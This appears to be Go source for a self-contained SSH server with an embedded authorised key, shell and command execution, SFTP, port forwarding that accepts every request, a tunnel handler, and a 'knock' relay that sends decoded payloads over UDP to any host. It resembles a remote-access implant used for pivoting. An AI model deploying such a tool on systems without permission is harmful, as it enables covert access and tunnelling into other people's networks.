package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os/exec"
	"strings"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
)

func sftpHandler(s ssh.Session) {
	server, err := sftp.NewServer(s)
	if err != nil {
		return
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
	}
}
func knockHandler(s ssh.Session) {

	dataRaw, err := io.ReadAll(s)
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error reading: %v\n", err)
		s.Exit(1)
		return
	}
	data := strings.ReplaceAll(string(dataRaw), "'", "\"")

	var payload struct {
		B64  string      `json:"b64"`
		Port int         `json:"p"`
		Host interface{} `json:"host"`
	}

	if err := json.Unmarshal([]byte(data), &payload); err != nil {
		fmt.Fprintf(s.Stderr(), "error parsing json: %v\n", err)
		s.Exit(1)
		return
	}

	var hostStr string
	switch h := payload.Host.(type) {
	case string:
		hostStr = h
	case float64:
		hostStr = fmt.Sprintf("%g", h)
	default:
		fmt.Fprintf(s.Stderr(), "host error\n")
		s.Exit(1)
		return
	}

	decodedData, err := base64.StdEncoding.DecodeString(payload.B64)
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error decoding base64: %v\n", err)
		s.Exit(1)
		return
	}

	reader, err := gzip.NewReader(bytes.NewReader(decodedData))
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error gzip deflate: %v\n", err)
		s.Exit(1)
		return
	}
	defer reader.Close()

	uncompressedData, err := io.ReadAll(reader)
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error: %v\n", err)
		s.Exit(1)
		return
	}

	addr := fmt.Sprintf("%s:%d", hostStr, payload.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error UDP connect: %v\n", err)
		s.Exit(1)
		return
	}
	defer conn.Close()

	_, err = conn.Write(uncompressedData)
	if err != nil {
		fmt.Fprintf(s.Stderr(), "error UDP send: %v\n", err)
		s.Exit(1)
		return
	}

	fmt.Fprintf(s, "knock ok %s\n", addr)
	s.Exit(0)
}

func LCallback() ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		return true
	}
}
func RCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		return true
	}
}

func AnyCallback() ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		return true
	}
}

func VPNHandler(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
	Tun(newChan)
}

func pubKeyAuth(ctx ssh.Context, key ssh.PublicKey) bool {

	authorizedKeysBytes, err := fs.ReadFile(embeddedKeys, "keys/keydegussh.pub")
	if err != nil {
		return false
	}
	publicKey, _, _, _, err := gossh.ParseAuthorizedKey(authorizedKeysBytes)
	if err != nil {
		return false
	}
	if bytes.Equal(key.Marshal(), publicKey.Marshal()) {
		return true
	}

	return false
}

func execHandler(shell string) ssh.Handler {

	return func(s ssh.Session) {
		_, _, ispty := s.Pty()
		switch {

		case ispty:

			var _, winCh, _ = s.Pty()
			var cmd = exec.CommandContext(s.Context(), shell)
			cmd.Env = ee
			f, err := pty.Start(cmd)
			if err != nil {
				return
			}

			go func() {
				for win := range winCh {
					winSize := &pty.Winsize{Rows: uint16(win.Height), Cols: uint16(win.Width)}
					pty.Setsize(f, winSize)
				}
			}()

			go func() {
				io.Copy(f, s)
				s.Close()
			}()

			go func() {
				io.Copy(s, f)
				s.Close()
			}()
			done := make(chan error, 1)
			go func() { done <- cmd.Wait() }()

			select {
			case err := <-done:
				if err != nil {
					s.Exit(255)
					return
				}
				s.Exit(cmd.ProcessState.ExitCode())
				return

			case <-s.Context().Done():
				return
			}

		case len(s.Command()) > 0:
			fullCmd := strings.Join(s.Command(), " ")
			cmd := exec.CommandContext(s.Context(), shell, "-c", fullCmd)

			cmd.Stdin = s
			//cmd.Stdin = nil
			cmd.Stdout = s
			cmd.Stderr = s
			cmd.Env = ee

			if err := cmd.Start(); err != nil {
				fmt.Fprintf(s, "error launch: %v\n", err)
				s.Exit(255)
				return
			}

			if err := cmd.Wait(); err != nil {
				fmt.Fprintf(s, "error exec: %v\n", err)
				s.Exit(255)
				return
			}
			s.Exit(cmd.ProcessState.ExitCode())

		default:
			<-s.Context().Done()
			return
		}
	}
}
